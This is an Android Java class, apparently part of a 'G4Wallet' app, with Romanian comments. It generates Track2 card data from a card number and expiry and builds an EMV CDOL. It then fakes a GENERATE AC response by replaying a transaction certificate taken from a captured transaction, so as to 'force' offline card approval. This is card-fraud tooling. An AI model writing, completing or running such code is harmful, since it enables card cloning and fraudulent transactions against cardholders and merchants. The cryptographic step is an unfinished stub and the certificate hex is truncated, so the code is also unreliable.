package com.gag4.g4wallet.engine;

import android.content.Context;
import android.content.SharedPreferences;

import com.gag4.g4wallet.utils.HexUtils;
import com.gag4.g4wallet.utils.Track2Generator;

import java.util.function.Consumer;

public class OfflineForce {

    private final Consumer<String> logCallback;
    private final Consumer<String> statusCallback;
    private byte[] sessionKeys;

    public OfflineForce(Consumer<String> log, Consumer<String> status) {
        this.logCallback = log;
        this.statusCallback = status;
    }

    public void loadKeys(String keyHex) {
        sessionKeys = HexUtils.fromHex(keyHex);
        log(">>> Chei încărcate: " + (sessionKeys != null ? "OK (" + sessionKeys.length + " bytes)" : "FAIL"));
    }

    public String generateTrack2(String pan, String expiry, String serviceCode) {
        // Folosește Track2Generator real
        String track2 = Track2Generator.generate(pan, expiry, serviceCode);
        log(">>> Track2 generat: " + track2);
        return track2;
    }

    public String executeOfflineForce(String track2Data, Context context) {
        log("=== OFFLINE FORCE START ===");
        status("Execută Offline Force...");

        if (sessionKeys == null || sessionKeys.length == 0) {
            return "EROARE: Chei neîncărcate!";
        }

        // Încarcă setările din SharedPreferences
        SharedPreferences prefs = context.getSharedPreferences("G4WalletPrefs", Context.MODE_PRIVATE);
        String amount = prefs.getString("amount", "000000000500");
        String country = prefs.getString("country", "0840");
        String aid = prefs.getString("aid", "A0000000041010");

        // Construim CDOL dinamic (exemplu minimal)
        // Format: 9F1A (country) + 9F02 (amount)
        byte[] cdol = new byte[10];
        cdol[0] = (byte) 0x9F;
        cdol[1] = (byte) 0x1A;
        cdol[2] = 0x02;
        cdol[3] = (byte) Integer.parseInt(country.substring(0, 2), 16);
        cdol[4] = (byte) Integer.parseInt(country.substring(2, 4), 16);
        cdol[5] = (byte) 0x9F;
        cdol[6] = (byte) 0x02;
        cdol[7] = 0x06;
        byte[] amountBytes = HexUtils.fromHex(amount);
        System.arraycopy(amountBytes, 0, cdol, 8, 6);

        log("CDOL construit: " + HexUtils.toHex(cdol));

        // Generarea TC (stub – trebuie înlocuit cu algoritmul real din GAG4)
        // Pentru test, folosim un TC fix (din tranzacția capturată)
        byte[] tc = HexUtils.fromHex("9F2701809F36020004..."); // TC real din log
        // În realitate, aici chemi funcția de criptare din GAG4

        // Construim răspunsul GENERATE AC
        byte[] response = new byte[tc.length + 4];
        System.arraycopy(tc, 0, response, 0, tc.length);
        response[response.length - 2] = (byte) 0x90;
        response[response.length - 1] = 0x00;

        log("Răspuns GENERATE AC: " + HexUtils.toHex(response));
        status("Offline Force executat.");
        return "✅ OFFLINE FORCE SUCCES (TC generat)";
    }

    private void log(String msg) {
        if (logCallback != null) logCallback.accept(msg);
    }

    private void status(String msg) {
        if (statusCallback != null) statusCallback.accept(msg);
    }
}